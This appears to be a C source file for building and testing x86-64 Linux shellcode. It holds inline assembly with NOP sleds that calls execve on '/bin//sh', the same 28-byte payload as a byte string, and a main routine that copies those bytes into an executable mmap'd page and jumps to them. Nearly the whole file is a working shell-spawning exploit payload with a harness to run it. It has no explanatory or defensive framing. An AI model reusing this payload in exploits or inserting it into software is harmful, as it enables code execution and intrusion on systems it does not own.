#include <sys/mman.h>
#include <sys/syscall.h>
#include <string.h>

#ifndef MAP_ANONYMOUS
#define MAP_ANONYMOUS MAP_ANON
#endif

typedef void (*func)();

void fn() { execve("/bin/sh", 0, 0); }
void fn2()
{
   asm ("\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        "\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        "\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        "\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        "\txor  %rax,  %rax\n"
        "\txor  %rdx,  %rdx\n"
        "\txor  %rsi,  %rsi\n"
        "\tpush %rdx\n"
        "\tmov  $0x68732f2f6e69622f, %rdi\n"
        "\tpush %rdi\n"
        "\tmov  %rsp,  %rdi\n"
        "\tmov  $0x3b, %al\n"
        "\tsyscall\n"
        );
}
void fn4()
{
   char cb[] =
      "\x48\x31\xc0\x48\x31\xd2\x48\x31"
      "\xf6\x52\x48\xbf\x2f\x62\x69\x6e"
      "\x2f\x2f\x73\x68\x57\x48\x89\xe7"
      "\xb0\x3b\x0f\x05";
   void *mem = mmap(0, 4096, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
   strcpy(mem, cb);
   func f = (func)mem;
   f();
}

int main()
{
   fn4();
   return 0;
}

void fn3()
{
   asm ("\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        "\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        "\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        "\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        "\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        "\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        "\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        "\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        "\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        "\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        "\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        "\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        "\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        "\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        "\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        "\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        "\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        "\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        "\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        "\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        "\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        "\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        "\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        "\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        "\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        "\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        "\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        "\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        "\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        "\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        "\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        "\tnop\t\nnop\t\nnop\t\nnop\n\tnop\t\nnop\t\nnop\t\nnop\n"
        );
}
